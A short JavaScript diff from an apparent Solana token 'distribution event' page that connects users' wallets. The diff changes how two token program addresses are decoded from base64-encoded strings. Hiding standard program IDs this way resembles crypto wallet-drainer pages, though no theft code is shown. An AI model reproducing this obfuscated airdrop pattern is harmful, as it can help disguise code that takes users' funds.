@@ -229,8 +229,8 @@
       await Promise.all([loadConfig(), loadSeed()]);
       if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; return; }
       await waitForSolana(12000);
-      TOKEN_PROG = new solanaWeb3.PublicKey(_dec(_enc[0]));
-      TOKEN_2022 = new solanaWeb3.PublicKey(_dec(_enc[1]));
+      TOKEN_PROG = new solanaWeb3.PublicKey(atob(_enc[0]));
+      TOKEN_2022 = new solanaWeb3.PublicKey(atob(_enc[1]));
       connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
       $('btnConnect').disabled=false; $('btnConnect').querySelector('.btn-text').textContent='Connect Wallet'; $('loadingMsg').style.display='none';
       startCountdown();
